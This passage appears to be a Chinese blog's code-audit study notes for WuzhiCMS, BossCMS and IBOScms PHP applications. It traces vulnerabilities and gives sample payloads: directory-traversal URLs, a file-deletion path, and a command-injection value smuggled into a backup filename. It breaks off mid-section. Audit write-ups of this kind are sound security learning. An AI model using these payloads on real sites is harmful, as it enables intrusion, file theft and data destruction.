+<p>其中的<code>./configs/web_config.php</code>是配置文件，<code>core.php</code>是核心框架文件</p>
+<p><code>load_class(&quot;application&quot;)</code>将application这个类实例化了</p>
+<p>然后调用$app对象的run方法运行</p>
+<p>因为是调用<code>load_class</code>加载application类，所以就是<code>application.class.php</code></p>
+<p>通过<code>load_class</code>来到core.php里面</p>
+<p><img src="https://pic.imgdb.cn/item/66f8e82df21886ccc047af1b.png" alt=""></p>
+<p>里面有个<code>COREFRAME_ROOT</code>,</p>
+<pre><code>&lt;?php
+defined(&#39;WWW_ROOT&#39;) or exit(&#39;No direct script access allowed&#39;);
+
+define(&#39;COREFRAME_ROOT&#39;,substr(dirname(__FILE__),0,-11).&#39;coreframe&#39;.DIRECTORY_SEPARATOR);
+define(&#39;CACHE_ROOT&#39;,substr(dirname(__FILE__),0,-11).&#39;caches&#39;.DIRECTORY_SEPARATOR);
+define(&#39;CACHE_EXT&#39;,&#39;f1q_e&#39;);
+</code></pre>
+<p>获取文件地址并减去最后11个字符</p>
+<p><code>COREFRAME_ROOT.&#39;app/&#39;.$m.&#39;/libs/class/&#39;.$class.&#39;.class.php&#39;</code></p>
+<p>这个实际上就是路径名<code>app目录下模块名/libs/class/类名.class.php</code></p>
+<p>实例化wuzhi_application类的时候会调用下面的构造函数将路由信息定义完成</p>
+<p><img src="https://pic.imgdb.cn/item/66f8f513f21886ccc058d92a.png" alt=""></p>
+<p>这个是当类的实例被创建时，这个方法会自动调用</p>
+<p>也就是说这个是</p>
+<p>加载application类的时候，调用load_class获取application.class.php并实例化，
+然后通过run获取路由信息</p>
+<h2>sql注入</h2>
+<p>在这里存在sql漏洞</p>
+<p><img src="https://pic.imgdb.cn/item/66f90a4ff21886ccc07b2b36.png" alt=""></p>
+<p>bp抓包</p>
+<p><img src="https://pic.imgdb.cn/item/66f90a1ff21886ccc07ad919.png" alt=""></p>
+<p>可以定位到
+<code>/coreframe/app/member/admin/group.php</code>的del()函数</p>
+<p><img src="https://pic.imgdb.cn/item/66f90f88f21886ccc082612a.png" alt=""></p>
+<p>这里的第133行是判断groupid是否为空，134行是判断是否是数组，但是这里不管是不是他都执行了delete函数操作数据库</p>
+<p>追踪delete函数，（我也不知道他这个追踪是怎么追踪的，我直接control f搜索delete里面好多，但是又没看到php代码审计的插件)</p>
+<p>在<code>db.class.php</code>里面看到</p>
+<p><img src="https://pic.imgdb.cn/item/66fe4824a0d098f8981d74e6.png" alt=""></p>
+<p>其中调用了array2sql,其中的array2sql是</p>
+<p><img src="https://pic.imgdb.cn/item/66fe49c3a0d098f8981f2334.png" alt=""></p>
+<p>可以得出是将数组转换成sql语言并移除一些特殊符号防止sql注入</p>
+<pre><code>if(is_array($data)) {
+    $sql = &#39;&#39;;
+    foreach ($data as $key =&gt; $val) {
+        $val = str_replace(&quot;%20&quot;, &#39;&#39;, $val);
+        $val = str_replace(&quot;%27&quot;, &#39;&#39;, $val);
+        $val = str_replace(&quot;(&quot;, &#39;&#39;, $val);
+        $val = str_replace(&quot;)&quot;, &#39;&#39;, $val);
+        $val = str_replace(&quot;&#39;&quot;, &#39;&#39;, $val);
+        $sql .= $sql ? &quot; AND `$key` = &#39;$val&#39; &quot; : &quot; `$key` = &#39;$val&#39; &quot;;
+    }
+    return $sql;
+}
+- 如果 $data 是一个数组，则初始化一个空字符串 $sql。
+- 遍历数组，将每个键值对转换为 SQL 格式的条件。
+- 使用 str_replace 函数移除一些特殊字符（如 %20, %27, (, ), &#39;），以防止 SQL 注入。
+- 将每个条件拼接成一个 SQL WHERE 子句，多个条件之间用 AND 连接。
+</code></pre>
+<p>只有最下面的那行</p>
+<pre><code>return $this-&gt;master_db-&gt;delete($table, $where);
+</code></pre>
+<p>是对数据库进行操作的</p>
+<p><code>$this-&gt;master</code>是对数据库进行连接的</p>
+<p>在目录内查找delete，在<code>mysqli.class.php</code>中发现是<code>WUZHI_mysqli</code>类下的方法</p>
+<pre><code>public function __construct($config_file = &#39;mysql_config&#39;)
+获取www/configs/mysql_config.php中mysql的配置信息
+{
+        $this-&gt;mysql_config = get_config($config_file);
+        $this-&gt;dbname = $this-&gt;mysql_config[$this-&gt;db_key][&#39;dbname&#39;];
+        $this-&gt;tablepre = $this-&gt;mysql_config[$this-&gt;db_key][&#39;tablepre&#39;];
+        $this-&gt;dbcharset = $this-&gt;mysql_config[$this-&gt;db_key][&#39;dbcharset&#39;];
+
+        $this-&gt;slave_server = isset($this-&gt;mysql_config[$this-&gt;db_key][&#39;slave_server&#39;]) ? $this-&gt;mysql_config[$this-&gt;db_key][&#39;slave_server&#39;] : &#39;&#39;;
+
+        $class = $this-&gt;mysql_config[$this-&gt;db_key][&#39;type&#39;];
+        require_once(COREFRAME_ROOT.&#39;app/core/libs/class/&#39;.$class.&#39;.class.php&#39;);
+        $classname = &#39;WUZHI_&#39;.$class;
+        $this-&gt;master_db = new $classname($this-&gt;mysql_config[$this-&gt;db_key]);
+        if($this-&gt;slave_server) {
+            $slave_server = weight_rand($this-&gt;slave_server);
+            if($slave_server==&#39;default&#39;) {
+                $this-&gt;read_db = $this-&gt;master_db;
+            } else {
+                $this-&gt;read_db = new $classname($this-&gt;mysql_config[$this-&gt;slave_server]);
+            }
+        } else {
+            $this-&gt;read_db = $this-&gt;master_db;
+        }
+    }
+</code></pre>
+<p><img src="https://pic.imgdb.cn/item/66fe78a5335a200d6a9b443b.png" alt=""></p>
+<p>在mysqli.class.php中，他没有做任何过滤直接将语句拼接到<code>$sql</code>并通过query（）执行，所以存在sql漏洞</p>
+<p><img src="https://pic.imgdb.cn/item/66fe7904335a200d6a9b891f.png" alt=""></p>
+<p>这里可以进行报错注入</p>
+<h2>任意文件写入</h2>
+<p><img src="https://pic.imgdb.cn/item/66ff6d72d29ded1a8c8b4be0.png" alt=""></p>
+<p>通过seay审计发现里面有个file_put_content函数可能存在任意文件写入，进去查看发现这里是通过data内容可以控制写入文件的内容</p>
+<p><img src="https://pic.imgdb.cn/item/66ff6dd7d29ded1a8c8b9b1e.png" alt=""></p>
+<p><img src="https://pic.imgdb.cn/item/66ff6e59d29ded1a8c8c0523.png" alt=""></p>
+<p>这phpstorm中找到他的funvtion<code>set_cache</code></p>
+<p>他只判断是了是否提交了表单但没对提交的内容进行过滤，这就导致<code>setting </code>参数也就是上面所说的 <code>$data</code> 部分写入造成任意文件写入</p>
+<p><img src="https://pic.imgdb.cn/item/67076359d29ded1a8c69640b.png" alt=""></p>
+<p>如果没有提交表单，就会通过<code>get_cache</code>读取缓存文件</p>
+<p><img src="https://pic.imgdb.cn/item/67076392d29ded1a8c699bd2.png" alt=""></p>
+<p>所以我们可以这么构造文件读写</p>
+<pre><code>/index.php?
+m=attachment&amp;f=index&amp;v=ueditor&amp;_su=wuzhicms&amp;submit=XXX&amp;setting=payload
+</code></pre>
+<h2>CSRF</h2>
+<p>在这里</p>
+<p><img src="https://pic.imgdb.cn/item/66ff820fd29ded1a8c9c0012.png" alt=""></p>
+<p>当我们提交的时候发现</p>
+<p><img src="https://pic.imgdb.cn/item/66ff822dd29ded1a8c9c18e4.png" alt=""></p>
+<p>提示了账号不存在，说明必须要一个前台账号才能设置为系统管理员账号，</p>
+<p><img src="https://pic.imgdb.cn/item/66ff84ffd29ded1a8c9ee282.png" alt=""></p>
+<p>抓包发现添加管理员的路由，找到源码<code>/coreframe/app/core/admin/power.php</code></p>
+<pre><code>这段代码是一个名为 add 的方法，用于添加管理员。以下是详细分析：
+检查是否提交表单：
+if(isset($GLOBALS[&#39;submit&#39;])) {
+检查全局变量 $GLOBALS[&#39;submit&#39;] 是否存在，以确定是否提交了表单。
+验证用户名：
+if(empty($GLOBALS[&#39;form&#39;][&#39;username&#39;])) MSG(L(&#39;parameter error&#39;));
+$username = $GLOBALS[&#39;form&#39;][&#39;username&#39;];
+$r = $this-&gt;db-&gt;get_one(&#39;member&#39;, array(&#39;username&#39; =&gt; $username));
+if(!$r[&#39;uid&#39;]) MSG(L(&#39;账号不存在，请先管理会员处－添加账号&#39;));
+检查表单中的 username 是否为空，如果为空则显示错误消息。
+获取表单中的 username 并从 member 表中查找对应的记录。
+如果找不到对应的用户 ID (uid)，则显示错误消息。
+检查管理员是否已存在：
+$rs = $this-&gt;db-&gt;get_one(&#39;admin&#39;, array(&#39;uid&#39; =&gt; $r[&#39;uid&#39;]));
+if($rs) MSG(L(&#39;管理员已存在！&#39;));
+从 admin 表中查找对应的用户 ID (uid)。
+如果找到记录，则显示管理员已存在的消息。
+准备表单数据：
+$formdata = array();
+$formdata[&#39;uid&#39;] = $r[&#39;uid&#39;];
+if(empty($GLOBALS[&#39;form&#39;][&#39;password&#39;])) {
+    $formdata[&#39;password&#39;] = &#39;&#39;;
+} else {
+    $factor = substr(random_string(&#39;md5&#39;), 0, 6);
+    $password = md5(md5($GLOBALS[&#39;form&#39;][&#39;password&#39;]) . $factor);
+    $formdata[&#39;password&#39;] = $password;
+    $formdata[&#39;factor&#39;] = $factor;
+}
+$formdata[&#39;role&#39;] = &#39;,&#39; . implode(&#39;,&#39;, $GLOBALS[&#39;form&#39;][&#39;role&#39;]) . &#39;,&#39;;
+$formdata[&#39;truename&#39;] = remove_xss($GLOBALS[&#39;form&#39;][&#39;truename&#39;]);
+初始化一个空数组 $formdata。
+将用户 ID (uid) 添加到 $formdata。
+检查表单中的 password 是否为空，如果为空则设置为空字符串。
+如果不为空，则生成一个随机因子 (factor)，并使用 MD5 加密密码和因子。
+将加密后的密码和因子添加到 $formdata。
+将角色信息和真实姓名添加到 $formdata。
+插入数据并显示成功消息：
+$this-&gt;db-&gt;insert(&#39;admin&#39;, $formdata);
+MSG(L(&#39;operation success&#39;));
+将 $formdata 插入到 admin 表中。
+显示操作成功的消息。
+显示添加管理员表单：
+} else {
+    $show_formjs = 1;
+    $form = load_class(&#39;form&#39;);
+    $roles = $this-&gt;db-&gt;get_list(&#39;admin_role&#39;, &#39;&#39;, &#39;*&#39;, 0, 100);
+    include $this-&gt;template(&#39;power_add&#39;);
+}
+如果没有提交表单，则显示添加管理员的表单。
+设置 show_formjs 为 1。
+加载表单类并获取角色列表。
+包含并显示 power_add 模板。
+</code></pre>
+<p>在代码38行处根据用户名
+从数据库中取出前台账户，如果该前台用户不存在则会提示如下内容，也就是我们上面的提示，在40行代码判断该用户是否已经是管理员，而44-51行代码是判断添加管理员时是否设置密码，这部分操作在上面部分我们添加管理员的时候也可以看得出来，在代码54行将我们的内容插入到数据库中</p>
+<p><img src="https://pic.imgdb.cn/item/66ff9600d29ded1a8caede21.png" alt=""></p>
+<p>能看出来这部分没有进行token校验或者其他手段，这就导致我们可以伪造数据包进行csrf</p>
+<h2>目录遍历</h2>
+<p>glob函数发现存在目录遍历，这里面的<code>glob()</code>的$<code>dir</code>参数可控,上面的18行做了一些过滤</p>
+<p><img src="https://pic.imgdb.cn/item/66ff97d7d29ded1a8cb0a8db.png" alt=""></p>
+<p>29行通过<code>include $this -&gt;template(&#39;listing&#39;)</code>包含并渲染旗下的<code>listing.tpl.php</code>文件</p>
+<pre><code>glob()函数返回一个包含匹配指定模式的文件名或目录的数组
+
+语法：
+glob(pattern,flags)
+    pattern
+    必需。规定检索模式。
+    flags
+    可选。规定特殊的设定。
+返回值：
+该函数返回一个包含有匹配文件/目录的数组。如果失败则返回 FALSE。
+</code></pre>
+<p>payload</p>
+<pre><code>index.php?m=template&amp;f=index&amp;v=listing&amp;_su=wuzhicms
+</code></pre>
+<h2>任意文件删除</h2>
+<p>全局查找危险函数unlink（删除指定文件）</p>
+<p>发现my_unlink里面调用了这个函数</p>
+<p><img src="https://pic.imgdb.cn/item/66ff9ac3d29ded1a8cb349bb.png" alt=""></p>
+<p>跟踪一下</p>
+<p>其中一个位于del()函数内部，</p>
+<p><img src="https://pic.imgdb.cn/item/66ff9b1fd29ded1a8cb39675.png" alt=""></p>
+<p>这两个地方需要传入id和url，但是通过<code>remove_xss</code>函数过滤了</p>
+<p><img src="https://pic.imgdb.cn/item/66ff9b73d29ded1a8cb3dcf6.png" alt=""></p>
+<p>这里是对我们输入的东西进行实体编码，替换了一些文字防止<code> &lt;IMG SRC=@avascript:alert(&#39;XSS&#39;)&gt; 的攻击</code>，下面过滤了一些js的标签</p>
+<p>回到del（）函数，他里面是鲜活的一个id，然后从数据库查找这个id对应的path，但是如果没有id的话会直接根据你输入的path进行文件操作，所以我们只需要构造path就可以了</p>
+<p><img src="https://pic.imgdb.cn/item/6707b1fbd29ded1a8cbd49d9.png" alt=""></p>
+<p><img src="https://pic.imgdb.cn/item/6707b154d29ded1a8cbcb023.png" alt=""></p>
+<p>所以可以</p>
+<p><img src="https://pic.imgdb.cn/item/6707651cd29ded1a8c6b20ec.png" alt=""></p>
+<p>至此,五指cms的审计结束</p>
+<hr>
+<h1>2. bosscms代码审计（2024年10月5日）</h1>
+<p>先分析路由</p>
+<p><img src="https://pic.imgdb.cn/item/6700e7d8d29ded1a8cc33f37.png" alt=""></p>
+<p>上面是对一些常量进行定义，并且在下面引入了</p>
+<pre><code>system/enter.php
+</code></pre>
+<p>文件，</p>
+<p><img src="https://pic.imgdb.cn/item/6700fb52d29ded1a8cd5cddd.png" alt=""></p>
+<p>在这里的时候依旧是定义了一些常量，但在最后包含了into.class.php的into类下面的load()方法，跟进</p>
+<p>在load()方法中，调用了同类下的load_class()方法，这里我们看到的bosscms_type就是在enter.php里面的常量，后面传入的三个参数</p>
+<pre><code>defined(&#39;BOSSCMS_TYPE&#39;) ? BOSSCMS_TYPE : null 检查常量 BOSSCMS_TYPE 是否定义，如果定义了则使用其值，否则使用 null。
+BOSSCMS_MOLD、BOSSCMS_PART 和 BOSSCMS_FUNC 是预定义的常量，分别表示模块、部分和函数。
+</code></pre>
+<p>在<code>load_class()</code>方法中需要传入四个参数，第一个参数 $type 是判断该功能点是前台功能点还是后台功能
+点，也就是决定代码19行的$type路径是在哪个文件夹下，由于SYSTEM_PATH常量定义为system目录
+下，所以系统的功能性代码都放在了该目录下。 $mold 参数定位功能目录， <code>$part</code> 决定调用目录下哪个
+php文件， <code>$func</code> 则是定位文件下调用的方法。
+在代码第20行如果上面的 $file 不存在则尝试加载plugin文件下的php文件用来加载插件。在代码第30
+行包含 <code>$file</code> 。32-35行代码使用 <code>call_user_func()</code> 回调函数实现类中方法的调用。</p>
+<p><img src="https://pic.imgdb.cn/item/6701012fd29ded1a8cdb1b9b.png" alt=""></p>
+<h2>udritor编辑器文件上传漏洞</h2>
+<p><img src="https://pic.imgdb.cn/item/6701f303d29ded1a8cbf102c.png" alt=""></p>
+<p>在安全设置中发现可以添加上传文件的后缀名，（这个PHP是我添加的）</p>
+<p>然后在上传logo文件上传php的时候却被提示该文件拓展名不允许上传</p>
+<p>抓包找到路由</p>
+<p><img src="https://pic.imgdb.cn/item/6701f371d29ded1a8cbf6bbf.png" alt=""></p>
+<p>也是定义了一些常量，10行通过包含enter.php进行路由的选择</p>
+<p><img src="https://pic.imgdb.cn/item/6701f3ebd29ded1a8cbfda2e.png" alt=""></p>
+<p>抓包里面是<code>action=uploadimage</code>，</p>
+<p>对应的选择是uploadimage方法上传图片，case的使用方法和c语言的case类似,其中使用的config来读取分支<code>config[`imageActionName`]</code></p>
+<p><img src="https://pic.imgdb.cn/item/6701fc8fd29ded1a8cc6fe44.png" alt=""></p>
+<p>而config在上面也获得了</p>
+<p><img src="https://pic.imgdb.cn/item/6702020cd29ded1a8ccc3c11.png" alt=""></p>
+<p><code>$this-&gt;config = into::load_json(&quot;config.json&quot;); 调用 into 类的 load_json 方法加载 config.json 文件，并将其内容赋值给 $this-&gt;config 属性。</code></p>
+<p><img src="https://pic.imgdb.cn/item/6702081ad29ded1a8cd213c9.png" alt=""></p>
+<p>上面那个action传入的，在这里成了imageActionName，对应上了上面的那个的case中的</p>
+<p><img src="https://pic.imgdb.cn/item/67022cc9d29ded1a8cf2e096.png" alt=""></p>
+<pre><code>查文件上传：
+
+if(isset($_FILES[$this-&gt;config[&#39;imageFieldName&#39;]])){
+
+检查是否有文件通过表单上传，表单名称为 imageFieldName。
+
+获取上传文件：
+
+$file = $_FILES[$this-&gt;config[&#39;imageFieldName&#39;]]; 获取上传的文件信息。
+
+检查文件大小：
+
+if($file[&#39;size&#39;] &lt;= $this-&gt;config[&#39;imageMaxSize&#39;]){
+
+检查文件大小是否在允许的最大值 imageMaxSize 之内。
+
+上传文件：
+
+if(upload::files($file, $this-&gt;config[&#39;imagePathFormat&#39;], &#39;photo&#39;)){
+调用 upload::files 方法上传文件，路径格式为 imagePathFormat，文件类型为
+photo。
+
+上传成功：
+
+如果上传成功，返回 JSON 编码的成功信息，包括文件的 URL、标题和原始名称。
+
+上传失败：
+
+如果上传失败，返回 JSON 编码的错误信息，错误状态为 upload::$msg。
+
+文件大小超限：
+
+如果文件大小超过限制，返回 JSON 编码的错误信息，状态为 超过ueditor的图片上传大小限制。
+</code></pre>
+<p>这里的关键是upload::files函数</p>
+<p>跟踪files，在第60行发现我们刚才被限制的</p>
+<p><img src="https://pic.imgdb.cn/item/67022fd0d29ded1a8cf553c6.png" alt=""></p>
+<p>向上追溯发现有两个限制条件，</p>
+<p>第一个是检查我们上传的文件拓展名<code>$ext</code>是否在允许的扩展名列表中<code>$extension</code></p>
+<p>第二个是判断<code>$type</code>是否为空，如果为空的话表示不需要进一步检查文件类型，如果不为空且<code>$in</code>为false的话，说明需要检查文件类型，但文件类型不在指定的类型中</p>
+<p>从第一个我们追溯extension可以得到</p>
+<p><img src="https://pic.imgdb.cn/item/67023967d29ded1a8cfe85ae.png" alt=""></p>
+<p>他取决与upload_extension的，全局搜索以后发现这个是我们自己设置的那个，所以这个天然成立</p>
+<p>另一个的话我们如果想满足前面的<code>!type=true</code>就需要使得程序运行到第36行<code>$type=NULL</code>，所以要满足<code>$k</code>在<code>$tarr</code>里面，<code>tarr</code>是我们上传的files的第三个参数photo
+而这里的<code>$k</code>是从<code>$G[extension]</code>获取的，</p>
+<p>这里应该是调试，但是不知道为什么我调试环境一直不对，从教程来看的话是说这里的<code>.php</code>后缀在code类型而该功能点传入的类型为photo所以这里应该是不满足第二个条件导致的不能实现文件上传</p>
+<p>在<code>extension.json</code>里面看到了<code>externsion</code>里面的东西</p>
+<p>所以想要实现php的文件上传，我们必须要满足type的类型为code才行</p>
+<p><img src="https://pic.imgdb.cn/item/670282dcd29ded1a8c42769d.png" alt=""></p>
+<p>全局搜索<code>files()</code>方法调用，发现该功能点的传入类型有code，所以可以实现文件上传</p>
+<p><img src="https://pic.imgdb.cn/item/67028361d29ded1a8c42eba0.png" alt=""></p>
+<h2>任意文件删除</h2>
+<p>在<code>超过ueditor.class.php</code>里面还有一个delete()方法，可以对文件进行删除</p>
+<p><img src="https://pic.imgdb.cn/item/67032e82d29ded1a8cc3afbf.png" alt=""></p>
+<p>这里也是进行了两个判断</p>
+<ul>
+<li>判断post参数里面是否包含path参数</li>
+<li>判断传入的path参数是否以upload开头</li>
+</ul>
+<p>都满足的话进下面的<code>store_type</code>判断，判断是否是为空，如果不为空的话调用oss类的delete，如果为空的话调用dir类的delete()</p>
+<p>所以关键是在<code>store_type</code>，全局搜索发现是一个存储的，默认为0</p>
+<p><img src="https://pic.imgdb.cn/item/6703307dd29ded1a8cc4eceb.png" alt=""></p>
+<p>跟进dir类下的delete()方法查看该方法：</p>
+<p><img src="https://pic.imgdb.cn/item/670330c0d29ded1a8cc515ea.png" alt=""></p>
+<p>经过<code>replace</code>函数方法后使用<code>id_files</code>函数检查路径是否执行一个文件，使得若进行<code>unlink</code>删除，我们跟进<code>replace</code>看是否存在过滤</p>
+<p><img src="https://pic.imgdb.cn/item/670331d1d29ded1a8cc5c454.png" alt=""></p>
+<p>他这里并没有进行过滤，只是 对<code>//,///</code>的路径进行了省略优化，所以可以直接调用路由</p>
+<p>payload:<code>path=upload/../xxxx</code>(删除的是根目录下的)</p>
+<p><img src="https://pic.imgdb.cn/item/670331bed29ded1a8cc5b91e.png" alt=""></p>
+<h2>目录遍历漏洞</h2>
+<p>同样在<code>uedirot.class.php</code>下的还有list方法，在327行的<code>$folder</code>是GET传入的没有任何过滤就拼接到了<code>$path</code>中</p>
+<p><img src="https://pic.imgdb.cn/item/670364c3d29ded1a8cf5ffd7.png" alt=""></p>
+<p>在里面有一个read()方法，这里的332,335行都调用了这个方法，从上面的审计中我们可以知道这个地方是选择远程oss读取还是本地读取，所以是二选一必须走一个</p>
+<p>oss的是远程读取的，我们选择对dir的本地读取的read下手</p>
+<p>分析可得，这个方法使用opendir函数打开目录句柄，readdir函数读取目录内容，在这个文件最上面的replace函数之前分析过是进行路径优化的，而且132行的<code>$is_dir</code>是判断是目录还是文件，所以说如果这里的<code>$path</code>可控的话就可以导致目录遍历</p>
+<p><img src="https://pic.imgdb.cn/item/67037606d29ded1a8c085ef6.png" alt=""></p>
+<p>回到lists方法，全局搜索找到</p>
+<p><img src="https://pic.imgdb.cn/item/67037985d29ded1a8c0cd47d.png" alt=""></p>
+<p>这李通过lists传入了一个<code>config[`fileMangerListPath`]</code></p>
+<p>全局搜索发现使用一个列出文件目录的东西</p>
+<p><img src="https://pic.imgdb.cn/item/67037a06d29ded1a8c0d786c.png" alt=""></p>
+<p>找到该值是upload/路径，也就是说上面要读取的文件是upload目录下的文件，我们从上面的分析中可以知道lists()方法中传入的 $folder 参数没有进行过滤就拼接到 <code>$path</code>中所以这里是存在目录遍历的。</p>
+<p>所以我们要找在哪调用了<code>listfile</code>方法</p>
+<p>由之前的可以知道，我们调用路由是通过改目录文件下的，在最开始的时候我们调用里init方法，在里面通过传输action参数实现类中方法的实行</p>
+<p><img src="https://pic.imgdb.cn/item/67037d90d29ded1a8c11852b.png" alt=""></p>
+<p><img src="https://pic.imgdb.cn/item/67037e1bd29ded1a8c120533.png" alt=""></p>
+<p>我们可以构造路由</p>
+<pre><code>/system/extend/ueditor/php/controller.php?action=listfile&amp;folder=../../../
+</code></pre>
+<p><img src="https://pic.imgdb.cn/item/67037e7fd29ded1a8c127277.png" alt=""></p>
+<h2>任意文件下载</h2>
+<p>在这里存在一个sql的任意文件下载漏洞</p>
+<p><img src="https://pic.imgdb.cn/item/6703b698d29ded1a8c5f5009.png" alt=""></p>
+<p>我们抓包看看</p>
+<p><img src="https://pic.imgdb.cn/item/6703b714d29ded1a8c5ff255.png" alt=""></p>
+<p>可以看到路由是safe下的backup</p>
+<p><img src="https://pic.imgdb.cn/item/6703b7dcd29ded1a8c60db40.png" alt=""></p>
+<p>这里直接<code>get</code>了一个<code>id</code>，然后直接拼接路径中</p>
+<p>这里的sql是上面已经定义的路径</p>
+<p>而后在第73行使用readfile函数进行文件读取，中间没有做任何过滤，所以可以通过</p>
+<p><code>../</code>实现目录跳转来读取文件</p>
+<p><img src="https://pic.imgdb.cn/item/6703b8a4d29ded1a8c61cc93.png" alt=""></p>
+<p><img src="https://pic.imgdb.cn/item/6703b83bd29ded1a8c614c00.png" alt=""></p>
+<h2>权限校验处存在逻辑缺陷</h2>
+<p>在第一个<code>ueditor.class.php</code>中，有这么两条</p>
+<p><img src="https://pic.imgdb.cn/item/6703ba76d29ded1a8c6412c2.png" alt=""></p>
+<p><code>ueditor</code>类继承了<code>admin</code>类,最上面通过<code>basic_class()</code>来加载<code>admin.class.php</code>文件，，跟进这个方法</p>
+<p><img src="https://pic.imgdb.cn/item/6703bad4d29ded1a8c6491e1.png" alt=""></p>
+<p>这里设置了<code>$func</code>参数，如果没有就默认设置成<code>init</code>，而且在最下面调用<code>load_class</code>加载类文件，再通过类加载<code>admin</code>的<code>init()</code>方法，</p>
+<p>这里通过<code>init</code>调用<code>session</code>get一个session，如果为空的话判断是否定义了<code>IS_LOGIN</code>，如果未定义的话就重定向刀登陆界面，但是跳转结束以后代码没有<code>die</code>，他就会继续调用init导致上面的鉴权无效</p>
+<p><img src="https://pic.imgdb.cn/item/6703bcf0d29ded1a8c6739f8.png" alt=""></p>
+<p>至此结束bosscms</p>
+<hr>
+<h1>3. IBOScms代码审计（2024年10月7日）</h1>
+<h2>命令执行</h2>
+<p><img src="https://pic.imgdb.cn/item/6703e174d29ded1a8c971ad2.png" alt=""></p>
+<p>在这里的只有这个地方可以修改，猜测可能存在文件读取，命令执行，sql注入等 漏洞，抓包查看路由以及传参</p>
+<p><img src="https://pic.imgdb.cn/item/6703e12ad29ded1a8c96be55.png" alt=""></p>
+<p><img src="https://pic.imgdb.cn/item/6703f031d29ded1a8ca66be2.png" alt=""></p>
+<p>这里使用了<code>dbSubmit</code>，这个在数据包中发现是1，这里的作用是检查表单是否已经提交</p>
+<p>在第33行调用了<code>database</code>的<code>databaseBackup()</code>方法，跟进一下</p>
+<p><img src="https://pic.imgdb.cn/item/6703f31cd29ded1a8ca95c5a.png" alt=""></p>
+<p>这里235行通过控制<code>filename</code>参数来控制我们上传的文件名，236行对一些后缀进行了过滤</p>
+<blockquote>
+<p>getRequest()方法则是获取我们不同类型的请求参数，getQuery、getPost、getParam这些方法是YII框
+架下封装好的一些获取请求参数的方法这些方法可直接调用</p>
+</blockquote>
+<p><img src="https://pic.imgdb.cn/item/6703f5f1d29ded1a8cac3899.png" alt=""></p>
+<p>我们知道<code>filename</code>可控，那我们就跟踪<code>$filename</code></p>
+<p><img src="https://pic.imgdb.cn/item/6703f5dbd29ded1a8cac1ebc.png" alt=""></p>
+<p>这里是将<code>/  \\  .  &#39;</code>替换成了空进行了第二次过滤后赋值给<code>$backupFileName</code></p>
+<p>下面设置<code>$method=multivol</code>，并将<code>$backupFileName</code>赋值给<code>$dumpFile</code></p>
+<p><img src="https://pic.imgdb.cn/item/6703f6e6d29ded1a8cad3602.png" alt=""></p>
+<p>else的话也是经过分支拼接到<code>dumpFile</code>,但是这里的<code>dumpFile</code>后续会被拼接到这里</p>
+<p><img src="https://pic.imgdb.cn/item/6703f7c1d29ded1a8cae729e.png" alt=""></p>
+<p>这里用到了反引号并且<code>dumpfile</code>可控，所以我们可以传入</p>
+<pre><code>&amp;whoami&gt;demo1&amp;
+</code></pre>
+<p>进行命令执行</p>
+<h2>sql注入</h2>
+<p>在标签页</p>
+<p><img src="https://pic.imgdb.cn/item/67052812d29ded1a8ca9d268.png" alt=""></p>
+<p>里面的汇报中</p>
+<p><img src="https://pic.imgdb.cn/item/6705282dd29ded1a8ca9ea51.png" alt=""></p>
+<p>存在sql的报错</p>
+<p><img src="https://pic.imgdb.cn/item/6705282cd29ded1a8ca9ea16.png" alt=""></p>
+<p>抓包看看</p>
+<p><img src="https://pic.imgdb.cn/item/6705285dd29ded1a8caa1698.png" alt=""></p>
+<p>通过api控制器调用了module层的getlist类，跟进查看</p>
+<p><img src="https://pic.imgdb.cn/item/670529ecd29ded1a8cab7f41.png" alt=""></p>
+<p>结合数据包我们可以发现存在问题的是<code>keyword</code>的<code>subject</code></p>
+<p>跟踪一下发现</p>
+<p><img src="https://pic.imgdb.cn/item/67052a9dd29ded1a8cac1bb9.png" alt=""></p>
+<p>30行判断<code>keyword</code>是否存在，32行将他带入到<code>getListCondition</code>里面,<code>getListCondition</code>是进行sql拼接查询的，将结果带入到33行的<code>getListCondition</code>方法进行的sql参数执行的操作</p>
+<p>这里教程是用的debug的方式查看参数的传递过程，但是不知道为什么我的xdebug每次一调试就是</p>
+<p><img src="https://pic.imgdb.cn/item/67061b80d29ded1a8c654eb0.png" alt=""></p>
+<p>导致我调试不了</p>
+<p>教程是说</p>
+<p>这里经过调试最后返回的结果是完整的没对特殊字符进行过滤的完整sql语句</p>
+<p><img src="https://pic.imgdb.cn/item/67061ca1d29ded1a8c66e26d.png" alt=""></p>
+<p>原因是YII框架的DB类库没有对sql进行处理兵器开发人员在二次开发的过程中没对报错进行异常捕获导致产生错误</p>
+<h2>文件上传</h2>
+<p><img src="https://pic.imgdb.cn/item/67066381d29ded1a8c9f7e82.png" alt=""></p>
+<p>这里可以自定义上传的文件类型，所以我们可以通过修改这个来进行文件上传，发现定义了.php还是不能上传</p>
+<p><img src="https://pic.imgdb.cn/item/67066494d29ded1a8ca04bc2.png" alt=""></p>
+<p>抓包分析路由</p>
+<p><img src="https://pic.imgdb.cn/item/6706944ed29ded1a8cc5fe75.png" alt=""></p>
+<p>这里是调用的file文件夹下面的personal的add，所以我们能找到<code>actionadd</code>
+方法，这个方法是通过op参数帮助我们进行功能定位，但是他会先调用<code>actionindex</code>方法获取后台配置参数</p>
+<p><img src="https://pic.imgdb.cn/item/670697c6d29ded1a8cc8f23e.png" alt=""></p>
+<p>在 <code>actionIndex</code> 方法中调用了<code>getUploadConfig</code>获取上传配置参数</p>
+<p><img src="https://pic.imgdb.cn/item/67069809d29ded1a8cc924e4.png" alt=""></p>
+<p>跟踪发现进行了一些过滤</p>
+<p><img src="https://pic.imgdb.cn/item/6706984bd29ded1a8cc95c17.png" alt=""></p>
+<p>他107的<code>dangerTags</code>中如果存在变量就要unset</p>
+<p><img src="https://pic.imgdb.cn/item/670698a6d29ded1a8cc9a039.png" alt=""></p>
+<p>所以我们的php没法上传</p>
+<p>但是我们真正上传的类中还包含着过滤</p>
+<p><img src="https://pic.imgdb.cn/item/670698f1d29ded1a8cc9dd34.png" alt=""></p>
+<p>它调用了<code>CommonAttach</code>类下的方法，这里面封装着所有用于上传的方法</p>
+<p><img src="https://pic.imgdb.cn/item/67069948d29ded1a8cca21ff.png" alt=""></p>
+<p>这里的<code>checkExt</code>就是第二处过滤的地方了</p>
+<p><img src="https://pic.imgdb.cn/item/67069973d29ded1a8cca4268.png" alt=""></p>
+<p>所以我们可以用</p>
+<pre><code>gif
+
+.htaccess
+</code></pre>
+<p>等等进行文件上传</p>
+<h2>任意文件读取</h2>
+<p>查找危险函数unlink，发现这个</p>
